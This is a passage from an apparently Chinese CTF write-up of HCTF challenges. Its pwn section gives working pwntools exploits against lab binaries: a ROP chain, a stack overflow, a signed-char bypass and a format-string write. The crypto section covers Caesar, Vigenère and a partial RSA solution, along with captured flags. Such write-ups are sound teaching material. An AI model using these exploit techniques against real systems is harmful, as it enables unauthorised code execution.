+</span></span></code></pre></div><p>strcmp绕过＋构造ROP链
+<img loading="lazy" src="https://s2.loli.net/2023/09/23/68YKTIx7JEHnUfp.png" alt="image.png"  />
+</p>
+<p>用ROPgadget查找出pop rdi的地址</p>
+<p><code>ROPgadget --binary 文件路径 --only &quot;pop|ret&quot; | grep rdi</code></p>
+<p>然后套用rop链的模板
+<code>payload = b'a'*offset +p64(pop_rdi)+ p64(binsh)+p64(call_system)</code></p>
+<p>exp如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;10.102.32.142&#34;</span><span class="p">,</span><span class="mi">31698</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;miyu&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pwnner</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x70</span> <span class="o">+</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x402640</span>
+</span></span><span class="line"><span class="cl"><span class="n">call_system</span><span class="o">=</span><span class="mh">0x401392</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x401513</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">call_system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;WhAt can Y0u d0....&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>得到flag</p>
+<h4 id="6rememberornot">6.rememberornot<a hidden class="anchor" aria-hidden="true" href="#6rememberornot">#</a></h4>
+<p>观察main函数，发现只要计算100道题的答案即可获得flag
+直接上脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;10.102.32.142&#34;</span><span class="p">,</span><span class="mi">38108</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">expression</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Expression</span> <span class="o">=</span> <span class="n">expression</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">Expression</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ans</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">Expression</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Ans</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">Ans</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>利用python内置的eval函数即可进行表达式的运算</p>
+<p>flag:<code>HCTF{Y0U_RE@l1Y_REMEMbER_Y0uR_mA7H968ce06ba4d9}</code></p>
+<h4 id="7overflow">7.overflow<a hidden class="anchor" aria-hidden="true" href="#7overflow">#</a></h4>
+<p>本题为最简单的栈溢出
+vuln函数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">vuln</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v1</span><span class="p">[</span><span class="mi">76</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+4Ch] [rbp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="nf">gets</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">system</span><span class="p">(</span><span class="s">&#34;cat flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>直接对<code>v1</code>进行溢出即可</p>
+<p>exp：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;10.102.32.142&#34;</span><span class="p">,</span><span class="mi">22019</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x50</span><span class="o">+</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span><span class="o">=</span><span class="mh">0x401225</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">offset</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h4 id="8-gift军训版">8. gift军训版<a hidden class="anchor" aria-hidden="true" href="#8-gift军训版">#</a></h4>
+<p>关键函数如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">junxun</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">you</span><span class="p">;</span> <span class="c1">// [rsp+6h] [rbp-Ah] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">fesitival</span><span class="p">;</span> <span class="c1">// [rsp+7h] [rbp-9h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fesitival</span> <span class="o">=</span> <span class="o">-</span><span class="mi">127</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[33mMilitary training? When is the festival</span><span class="se">\x1B</span><span class="s">[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">you</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You believe 0x%hhx is the fesitival?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">you</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">fesitival</span> <span class="o">!=</span> <span class="n">you</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34; nononono...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1337</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34; yesyesyes!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>又是熟悉的ASCII码为负值的情况</p>
+<p>实际的ASCII码为129</p>
+<p>exp：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;10.102.32.142&#34;</span><span class="p">,</span><span class="mi">47318</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">129</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h4 id="9小明的家庭住址">9.小明的家庭住址<a hidden class="anchor" aria-hidden="true" href="#9小明的家庭住址">#</a></h4>
+<p>本题核心点在于格式化字符串的利用</p>
+<p>main函数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">nt</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-70h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">format</span><span class="p">[</span><span class="mi">56</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-40h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+68h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n\x1B</span><span class="s">[33m---------------------------------------------&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;----------</span><span class="se">\x1B</span><span class="s">[0m</span><span class="se">\x1B</span><span class="s">[34mWelcome_to_address_SYSTEM</span><span class="se">\x1B</span><span class="s">[0m</span><span class="se">\x1B</span><span class="s">[33m----------&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;---------------------------------------------</span><span class="se">\x1B</span><span class="s">[0m</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[32;5mWhere is XiaoMing&#39;s Home?</span><span class="se">\x1B</span><span class="s">[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x30uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x1B</span><span class="s">[32;5mAnd where is XiaoHong&#39;s?</span><span class="se">\x1B</span><span class="s">[0m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">format</span><span class="p">,</span> <span class="mh">0x30uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>对于这种<code>printf</code>没有任何限制条件的情况，我们可以利用格式化字符串漏洞</p>
+<p>首先我们利用<code>%p</code>得到ret寄存器的地址</p>
+<p>然后计算偏移</p>
+<p><img loading="lazy" src="https://s2.loli.net/2023/09/23/FinO1UeXbhKayGm.png" alt="image.png"  />
+</p>
+<p>偏移为13</p>
+<p>然后我们找到后门函数的地址<code>0x40159C=4199836(十进制)</code></p>
+<p>可以构造<code>%4199836c%14$lln</code></p>
+<p>exp如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;10.102.32.142&#34;</span><span class="p">,</span> <span class="mi">40682</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;aaaa-%p&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Home?</span><span class="se">\x1b</span><span class="s1">[0m</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">5</span><span class="p">:</span><span class="mi">19</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addr</span> <span class="p">,</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x70</span><span class="o">+</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="n">Addr</span><span class="o">+</span><span class="n">offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%4199836c</span><span class="s1">%14$lln&#39;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h3 id="四crypto">四、Crypto<a hidden class="anchor" aria-hidden="true" href="#四crypto">#</a></h3>
+<h4 id="1caesar">1.caesar<a hidden class="anchor" aria-hidden="true" href="#1caesar">#</a></h4>
+<p>偏移量11</p>
+<p><code>hctf{obviouslythisiscaesarcipher}</code></p>
+<h4 id="2not_caesar">2.not_caesar<a hidden class="anchor" aria-hidden="true" href="#2not_caesar">#</a></h4>
+<p>维吉尼亚密码，且没有告诉我们密钥</p>
+<p>一个好用的网站  <a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
+<p>通过统计字符出现的频率来爆破出密码（文本足够长）</p>
+<img src="https://s2.loli.net/2023/08/27/2ItOmovyEb9kc8z.png" alt="image.png" style="zoom: 80%;" />
+<p><code>hctf{Icanbreakitwithoutkey}</code></p>
+<h4 id="3math">3.MathⅠ<a hidden class="anchor" aria-hidden="true" href="#3math">#</a></h4>
+<p>题目如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">prng</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">,</span> <span class="s1">&#39;HCTF</span><span class="si">{this_is_a_sample_flag}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#prng 参考2023新课标I卷P20</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span> <span class="o">=</span> <span class="n">prng</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">constraint</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span> <span class="o">=</span> <span class="mi">1000</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sample_a</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sample_b</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">time</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">=</span>  <span class="n">sys</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sample_a</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sample_b</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">all</span><span class="p">([</span><span class="n">sample_a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-</span><span class="n">sample_a</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">sys</span><span class="o">.</span><span class="n">d</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">time</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">all</span><span class="p">([</span><span class="n">sample_b</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="p">(</span><span class="n">i</span><span class="o">**</span><span class="mi">2</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="o">/</span><span class="n">sample_a</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">time</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="mi">3</span><span class="o">*</span><span class="n">sample_a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span><span class="o">*</span><span class="n">sample_a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="n">sample_a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">sum</span><span class="p">(</span><span class="n">sample_a</span><span class="p">[:</span><span class="mi">777</span><span class="p">]</span><span class="o">+</span><span class="n">sample_b</span><span class="p">[:</span><span class="mi">777</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rsa_plus</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">q</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
+</span></span><span class="line"><span class="cl">    <span class="n">e</span> <span class="o">=</span> <span class="mh">0x10001</span>
+</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r1</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">next</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r2</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">next</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span><span class="o">*</span><span class="n">r1</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span><span class="o">*</span><span class="n">r2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">h</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">p</span><span class="o">+</span><span class="mi">3</span><span class="o">*</span><span class="n">q</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">n</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">h</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">h1</span> <span class="o">=</span> <span class="n">constraint</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">h2</span> <span class="o">=</span> <span class="n">rsa_plus</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;n = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;c = </span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;hint1 = </span><span class="si">{</span><span class="n">h1</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;hint2 = </span><span class="si">{</span><span class="n">h2</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">n = 123448414953228974011805323696137868781943298061640108583721204983031140531897314375841622324228108297198646457634512292527604743406056418492269259916712299664727931022315281719439527653756604578385299396113560339992952472500080663133453498156861989739986186852600863076353168997852910108312422507070843691527
+</span></span></span><span class="line"><span class="cl"><span class="s2">c = 70355784775921655880380025465489949573241301926464797611681833071256665441460869302372712558837199110767728290007652944220079907048322612573185968943864339915304868935319658344195708544022979094906385190425552202576200107202487083736800245172584184112275476974513051986233708501062909943346214681580048469716
+</span></span></span><span class="line"><span class="cl"><span class="s2">hint1 = 234850971.0
+</span></span></span><span class="line"><span class="cl"><span class="s2">hint2 = 54673117809069678475594947601860826118221736045735845051744912971409541561632603188516528135267179886112707141940065852170163389165168708306257365103150093
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span></code></pre></div><p>constraint()函数描述了2023新课标I卷P20的题干部分
+并且告诉我们h1是$a_n$和$b_n$的前777项和，即
+$$
+S_{777}+T_{777}=h1
+$$
+我们由此可以计算出$a_n$的通项公式为$a_n=777n$
+根据time=1000，我们可以得出$r_1$和$r_2$是数列$a_n$的第1001项和第1002项，即：
+$$
+r_1=777\times1001\
+r_2=777\times1002
+$$
+然后根据含有$p,q$的两个式子，可以得到一个二元方程组：</p>
+<p>$$
+\begin{cases} p<em>q=n\ 2</em>p+3*q=hint2 \end{cases}
+$$
+其中$n$和$hint2$都是已知的，因此我们可以解出$p$和$q$。</p>
